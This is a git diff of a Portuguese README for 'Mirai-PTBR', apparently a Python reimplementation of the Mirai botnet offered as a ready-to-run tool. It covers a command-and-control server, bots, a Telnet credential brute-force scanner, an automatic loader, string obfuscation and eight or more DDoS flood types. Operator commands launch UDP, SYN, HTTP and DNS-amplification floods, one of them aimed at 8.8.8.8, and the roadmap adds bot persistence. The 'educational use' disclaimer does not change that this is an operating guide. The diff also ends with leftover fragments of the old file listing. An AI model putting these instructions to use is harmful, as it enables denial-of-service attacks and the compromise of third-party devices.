@@ -1,153 +1,389 @@
-# Mirai-PTBR
-Mirai botnet
+# 🔥 Mirai-PTBR v1.0
 
-## Criadores Do Projeto Mirai: 
-#### Paras Jha
-#### Josiah White
-#### Dalton Norman
+> **Implementação educacional do Mirai Botnet em Python puro para testes de penetração e pesquisa de segurança.**
 
-* This project is NOT affiliated with the original Mirai authors.
-* Created independently for educational and defensive security research purposes.
+[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
+[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![Status](https://img.shields.io/badge/status-Active%20Development-brightgreen.svg)]()
 
-> **Implementação educacional do Mirai Botnet em Python para testes de penetração autorizados.**
->
-> ⚠️ **USO EXCLUSIVO PARA PROFISSIONAIS DE SEGURANÇA AUTORIZADOS**
-> Este software é fornecido exclusivamente para testes de penetração, pesquisa de segurança,
-> e análise de malware em sistemas sobre os quais você possui autorização explícita por escrito.
-> O uso não autorizado é ilegal sob o Computer Fraud and Abuse Act (CFAA) e leis equivalentes.
+---
+
+## ⚠️ Aviso Legal
+
+**USO EXCLUSIVO PARA PROFISSIONAIS DE SEGURANÇA AUTORIZADOS**
+
+Este software é fornecido exclusivamente para:
+- ✅ Testes de penetração autorizados
+- ✅ Pesquisa de segurança em ambientes controlados
+- ✅ Análise em laboratórios de segurança
+- ✅ Fins educacionais com supervisão
+
+O uso não autorizado é **ILEGAL** sob o Computer Fraud and Abuse Act (CFAA) e leis equivalentes em diversos países.
+
+**Criadores originais do Mirai:** Paras Jha, Josiah White, Dalton Norman  
+⚠️ Este projeto **NÃO é afiliado** aos autores originais.
+
+---
 
 ## 📋 Visão Geral
 
-O **Mirai-PTBR** é uma reimplementação completa do Mirai botnet em Python puro,
-projetada para ambientes de laboratório controlados e assessments de segurança.
-Diferente do Mirai original (escrito em C para dispositivos IoT), esta versão
-é multiplataforma e modular, facilitando entendimento e modificação.
+**Mirai-PTBR** é um Mirai botnet completo reimplementado em **Python puro**, diferente do original que era C/ARM. Oferece:
 
-### Arquitetura
+✨ **Características principales:**
+- 🎛️ **CNC Assíncrono** - Servidor asyncio na porta 7000
+- 🤖 **Bot Multiplataforma** - Roda em qualquer SO com Python 3.8+
+- 🔍 **Scanner Integrado** - SYN scan + brute force de 62 credenciais
+- 💉 **Loader Automático** - Deploy via HTTP/TFTP/Echo
+- ⚔️ **8+ Tipos de Ataque** - UDP, SYN, ACK, HTTP, DNS, VSE, etc.
+- 🔐 **Ofuscação** - XOR, RC4, Base64 para strings sensíveis
+- 📊 **CLI Interativa** - Interface completa para operador
 
-┌──────────────┐     ┌──────────────┐     ┌──────────────┐ 
-│ CNC          │◄────│ Bot          │────►│ Ataques      │ 
-│ (asyncio)    │     │ (threading)  │     │ (scapy/raw)  │ 
-└──────┬───────┘     └──────┬───────┘     └──────────────┘ 
-       └────────┬───────────┘ 
-┌───────────────┴───────────────┐ 
-│ Scanner       │ (ThreadPoolExecutor) │
-└───────────────┬───────────────┘ 
-                │ 
-┌───────────────┴───────────────┐ └────► 
-│ Loader │ │ (HTTP/TFTP/Echo Deploy) │ 
-└───────────────────────────────┘
+---
 
-### Componentes
+## 🚀 Quick Start (5 minutos)
 
-| Componente | Descrição | Tecnologia |
-|-----------|-----------|------------|
-| **CNC** | Command & Control server | `asyncio` protocolo binário |
-| **Bot** | Cliente que recebe comandos | `threading` + raw sockets |
-| **Ataques** | 10 tipos de ataque DDoS | `scapy`, `socket`, `ssl` |
-| **Scanner** | Varredura + brute-force Telnet | `ThreadPoolExecutor` |
-| **Loader** | Deploy automático do binário | HTTP/TFTP/Echo |
-| **Obfuscation** | Ofuscação de strings/config | XOR/RC4/Base64 |
-
-## 🚀 Instalação
+### 1️⃣ Instalação
 
 ```bash
-# Clone
-git clone https://github.com/seuuser/mirai-ptbr.git
-cd mirai-ptbr
+# Clone e configure
+git clone https://github.com/ghostn4444/Mirai.git
+cd Mirai
+python3 -m venv venv && source venv/bin/activate
 
-# (Opcional) Virtual env
+# Instale dependências
+pip install -r requirements.txt
+mkdir -p bins logs
+
+# Teste importações
+python3 -c "import cnc, bot, scanner, attacks, loader; print('[+] Ready!')"
+```
+
+### 2️⃣ Terminal 1: Inicie o CNC
+
+```bash
+python3 main.py cnc --verbose
+# [+] CNC Server rodando em 0.0.0.0:7000
+# mirai>
+```
+
+### 3️⃣ Terminal 2: Conecte um Bot
+
+```bash
+python3 main.py bot --cnc-host 127.0.0.1 --cnc-port 7000
+# [+] Conectado ao CNC!
+# [*] Registrado como: bot-0x1a2b3c4d
+```
+
+### 4️⃣ Terminal 1 (CNC): Execute Comandos
+
+```bash
+mirai> status
+[*] Bots conectados: 1
+    └─ bot-0x1a2b3c4d (x86_64, 127.0.0.1)
+
+mirai> attack UDP 192.168.1.50 80 60
+[+] UDP Attack iniciado contra 192.168.1.50:80 por 60s
+
+mirai> stop
+[+] Ataque pausado
+```
+
+---
+
+## 📚 Documentação
+
+### 🔗 Recursos
+
+| Documento | Conteúdo |
+|-----------|----------|
+| [**Docs.md**](Docs.md) | 📖 Documentação técnica completa (2000+ linhas) |
+| [**README.md**](README.md) | 📄 Este arquivo - Quick start |
+| [**CODE**](cnc/protocol.py) | 💻 Protocolo binário Mirai |
+
+**Para informações detalhadas ➡️ [Abrir Docs.md](Docs.md)**
+
+---
+
+## 🏗️ Arquitetura
+
+```
+┌─────────────────────────────────────┐
+│   CNC Server (asyncio)              │
+│   Porta: 7000                       │
+│   - Gerencia bots                   │
+│   - Distribui ataques               │
+│   - CLI interativa                  │
+└────────────┬────────────────────────┘
+             │
+      ┌──────┴────────┬────────────┐
+      │               │            │
+   ┌──▼──┐       ┌────▼───┐   ┌───▼──┐
+   │Bot  │       │Scanner │   │Loader│
+   │(x3) │       │(threads)   │(HTTP)│
+   └──┬──┘       └────┬───┘   └───┬──┘
+      │               │            │
+      └───────────────┼────────────┘
+                      │
+         ┌────────────▼──────────────┐
+         │  Motores de Ataque DDoS   │
+         │  - UDP Flood              │
+         │  - SYN/ACK Flood          │
+         │  - HTTP Flood             │
+         │  - DNS Amplification      │
+         │  - VSE Attack             │
+         │  - etc                    │
+         └───────────────────────────┘
+```
+
+---
+
+## 📁 Estrutura do Projeto
+
+```
+mirai-ptbr/
+├── main.py                     # Entry point unificado
+├── requirements.txt            # Dependências
+├── README.md                   # Este arquivo (quick start)
+├── Docs.md                     # Documentação técnica completa
+├── LICENSE                     # MIT License
+│
+├── cnc/                        # Command & Control
+│   ├── server.py              # Servidor TCP asyncio
+│   ├── protocol.py            # Protocolo binário
+│   ├── attack.py              # Gerenciamento de ataques
+│   ├── client.py              # CLI interativa
+│   └── main.py                # Inicialização
+│
+├── bot/                        # Bot Client
+│   ├── bot.py                 # Payload principal
+│   ├── bot_minimal.py         # Versão minimalista
+│   └── build.sh               # Script de compilação
+│
+├── scanner/                    # Scanner + Propagação
+│   ├── scanner.py             # SYN scan + brute force
+│   ├── creds.py               # 62 credenciais padrão
+│   └── state_machine.py       # Máquina de estados TCP
+│
+├── loader/                     # Deploy Automático
+│   ├── loader.py              # Gerenciador de deploy
+│   ├── deploy.py              # Métodos (wget/tftp/echo)
+│   ├── payload_builder.py    # Compilação de payloads
+│   └── serve.py               # Servidor HTTP/TFTP
+│
+├── attacks/                    # Motores de Ataque
+│   ├── main.py                # Router de ataques
+│   ├── udp.py                 # UDP Flood
+│   ├── syn.py                 # SYN/ACK Flood
+│   ├── dns.py                 # DNS Amplification
+│   ├── http.py                # HTTP Flood
+│   ├── vse.py                 # VSE Attack
+│   └── (mais vetores)
+│
+├── tools/                      # Ferramentas
+│   ├── enc.py                 # Ofuscação XOR/RC4/Base64
+│   └── config_builder.py      # Config ofuscada
+│
+└── (diretórios opcionais)
+    ├── bins/                  # Binários compilados
+    └── logs/                  # Logs de operação
+```
+
+---
+
+## 🎮 Comandos CLI do CNC
+
+```bash
+# Status
+mirai> status                    # Mostra bots conectados
+mirai> bots                      # Lista detalhada de bots
+
+# Ataques
+mirai> attack UDP 192.168.1.1 80 60     # UDP Flood por 60s
+mirai> attack SYN 10.0.0.1 443 300      # SYN Flood por 300s
+mirai> attack HTTP http://alvo.com 120  # HTTP Flood por 120s
+mirai> attack DNS 8.8.8.8 53 180        # DNS Amplification
+mirai> stop                             # Para ataques
+
+# Gerenciamento
+mirai> kill bot-0x1a2b3c4d       # Encerra um bot
+mirai> broadcast CMD             # Envia comando para todos
+mirai> clear                      # Limpa tela
+mirai> help                       # Ajuda
+mirai> quit                       # Sai
+```
+
+Ver [**Docs.md > Interface CLI**](Docs.md#interface-cli-do-cnc) para detalhes completos.
+
+---
+
+## 🔧 Instalação Detalhada
+
+### Pré-requisitos
+
+```bash
+# Python 3.8+
+python3 --version
+
+# pip
+pip3 --version
+
+# (Opcional) git
+git --version
+```
+
+### Passos
+
+```bash
+# 1. Clone
+git clone https://github.com/ghostn4444/Mirai.git
+cd Mirai
+
+# 2. Ambiente virtual (recomendado)
 python3 -m venv venv
 source venv/bin/activate
 
-# Dependências
+# 3. Instale dependências
 pip install -r requirements.txt
 
-# Estrutura de diretórios
-mkdir -p bins logs
+# 4. Crie diretórios
+mkdir -p bins logs configs
+
+# 5. Teste
+python3 main.py --help
 ```
 
-## Dependências
+### Dependências
+
+```
+scapy>=2.4.5      # Raw sockets para SYN/ACK/DNS
+pyinstaller>=5.0  # (Opcional) Compilação de bot
+```
+
+Maioria usa **stdlib** do Python 3.8+.
+
+---
+
+## 📖 Tipos de Ataques
+
+| ID | Nome | Porta | Descrição |
+|----|----|-------|-----------|
+| 0 | **UDP** | Variável | UDP Flood com payload aleatório |
+| 1 | **SYN** | 23/80/443 | SYN Flood com IP spoofed |
+| 2 | **ACK** | Variável | ACK Flood com IP spoofed |
+| 3 | **HTTP** | 80/443 | HTTP GET/POST Flood |
+| 4 | **DNS** | 53 | DNS Amplification (~60x) |
+| 5 | **GREIP** | Variável | GRE Tunnel IP-in-IP |
+| 6 | **GREETH** | Variável | GRE Tunnel Ethernet |
+| 7 | **VSE** | 27015+ | Valve Source Engine |
+| 8 | **STOMP** | 61613 | STOMP Protocol |
+
+---
+
+## 🛠️ Exemplos de Uso
+
+### Exemplo 1: Ataque UDP Simples
 
 ```bash
-# requirements.txt
-asyncio              # (stdlib) CNC server
-scapy>=2.4.5         # (opcional) Para raw sockets avançados
-pyinstaller>=5.0     # (opcional) Para compilar bot
+# Terminal 1: CNC
+python3 main.py cnc
+
+# Terminal 2: Bot
+python3 main.py bot
+
+# Terminal 1: Ataque
+mirai> attack UDP 192.168.1.50 80 30
+[+] UDP Attack iniciado contra 192.168.1.50:80 por 30s
 ```
-Python 3.8+ (stdlib cobre 90% das funcionalidades).
 
-## 🎮 Uso Rápido
-
-### 1. Inicie o CNC
+### Exemplo 2: Múltiplos Bots
 
 ```bash
-python main.py cnc
+# Terminal 2: Bot 1
+python3 main.py bot --cnc-port 7000
 
-# Ou diretamente:
+# Terminal 3: Bot 2
+python3 main.py bot --cnc-port 7000
 
-python -m cnc.main
+# Terminal 4: Bot 3
+python3 main.py bot --cnc-port 7000
+
+# Terminal 1: Distribuir ataque
+mirai> attack SYN 10.0.0.5 443 60
+[+] Ataque distribuído para 3 bots
 ```
 
-### 2. Compile e execute o Bot
+### Exemplo 3: DNS Amplification
 
 ```bash
-# Terminal 2: Compila
-CNC_HOST=127.0.0.1 python -m bot.build
-
-# Terminal 3: Executa
-python -m bot.bot
+mirai> attack DNS 8.8.8.8 53 180
+[+] DNS Amplification contra 8.8.8.8 por 180s
+# Amplificação ~60x com múltiplos bots
 ```
 
-### 3. Interaja com o CNC
+---
 
-```
-> bots                    # Lista bots conectados
-> stats                   # Estatísticas
-> attack udp 192.168.1.1  # Ataca alvo
-> attack all              # Ataca todos os alvos
-> attacks                 # Lista ataques ativos
-> stop                    # Para ataque atual
-```
+## 🔍 Troubleshooting
 
-### 4. Escaneie e infecte
+| Problema | Solução |
+|----------|---------|
+| "Port 7000 already in use" | `lsof -i :7000` / `kill -9 <PID>` ou usar `--port 8000` |
+| Bot não conecta ao CNC | Verificar firewall, IP/porta corretos |
+| "Permission denied" em SYN | Raw sockets requerem root: `sudo python3 main.py bot` |
+| Scanner não encontra dispositivos | Verificar se porta 23 (Telnet) está aberta em rede alvo |
 
-```bash
-# Scanner + Loader integrados
-python main.py scan --network 192.168.1.0/24
+Ver [**Docs.md > Troubleshooting**](Docs.md#troubleshooting) para mais.
 
-# Loader standalone
-python -m loader.loader --interactive
-```
+---
 
-## 📂 Estrutura do Projeto
+## 🧪 Desenvolvimento
 
-```bash
-mirai-ptbr/
-├── main.py                 # Entry point unificado
-├── requirements.txt        # Dependências
-├── README.md               # Esta documentação
-├── DOCS.md                 # Documentação técnica completa
-│
-├── cnc/                    # Command & Control
-│   ├── __init__.py
-│   ├── main.py             # Entry point (server + CLI)
-│   ├── server.py           # Servidor TCP asyncio
-│   ├── protocol.py         # Protocolo binário
-│   ├── attack.py           # Gerenciador de ataques
-│   └── client.py           # CLI interativa
-│
-├── bot/                    # Bot client
-│   ├── __init__.py
-│   ├── bot.py              # Bot principal
-│   ├── bot_minimal.py      # Versão minimalista (~150 linhas)
-│   └── build.sh            # Script de build (PyInstaller)
-│
-├── attacks/                # Módulos de ataque
-│   ├── __init__.py
-│   ├── main.py             # Router + AttackRunner
-│   ├── udp.py              # UDP flood
-│   ├── syn.py              # SYN/ACK flood
+### Adicionar Novo Tipo de Ataque
+
+1. Criar arquivo em `attacks/novo_ataque.py`
+2. Implementar função `novo_ataque()`
+3. Registrar em `attacks/protocol.py` (classe `AttackType`)
+4. Adicionar rota em `attacks/main.py`
+5. Usar via CLI: `attack NOVO 192.168.1.1 80 60`
+
+Ver [**Docs.md > Desenvolvimento**](Docs.md#desenvolvimento) para exemplos de código.
+
+---
+
+## 📞 Suporte
+
+- 📖 **Documentação:** [Docs.md](Docs.md)
+- 🐛 **Issues:** GitHub Issues (se disponível)
+- 💬 **Discussões:** GitHub Discussions (se disponível)
+
+---
+
+## 📄 Licença
+
+MIT License - Ver [LICENSE](LICENSE) para detalhes.
+
+---
+
+## 🎯 Features Planejadas
+
+- [ ] Suporte a IPv6
+- [ ] Criptografia de protocolo CNC
+- [ ] Dashboard web de monitoramento
+- [ ] Compilação automática de bot para ARM/MIPS
+- [ ] Mais vetores de ataque (NTP, Smurf, etc)
+- [ ] Persistência e auto-atualização de bot
+
+---
+
+## 📚 Referências
+
+- [Mirai Original](https://github.com/jgamblin/Mirai-Source-Code)
+- [Scapy Documentation](https://scapy.readthedocs.io/)
+- [Raw Sockets](https://en.wikipedia.org/wiki/Raw_socket)
+- [DDoS Vectors](https://owasp.org/www-community/attacks/Denial_of_Service)
+
+---
+
+**Desenvolvido para fins educacionais e pesquisa de segurança autorizada.**
 │   ├── dns.py              # DNS amplification
 │   ├── http.py             # HTTP GET/POST flood
 │   └── vse.py              # Valve Source Engine query flood
